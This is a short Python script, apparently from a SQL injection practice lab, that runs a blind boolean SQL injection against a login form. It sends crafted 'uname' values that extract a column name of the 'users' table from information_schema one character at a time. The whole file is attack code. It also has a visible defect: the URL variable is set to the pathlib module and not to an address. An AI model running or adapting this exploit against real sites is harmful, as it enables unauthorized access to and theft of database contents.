#!/usr/bin/python
import pathlib
import requests, sys

for posi in range(1,11):
	for chara in range(30,125):
		url = pathlib
		output = ""
		pay = "(select column_name from information_schema.columns where table_name='users' limit 3,1)"
		payload = "x' or ascii(substring("+pay+","+str(posi)+",1))="+str(chara)+"#"

		data = {
			"uname":payload,
			"pwd":"guest"
		}
		req = requests.post(url, data=data)
		# print payload
		if "Username/Password is invalid" not in req.text:
			print(chr(chara))
print("\n")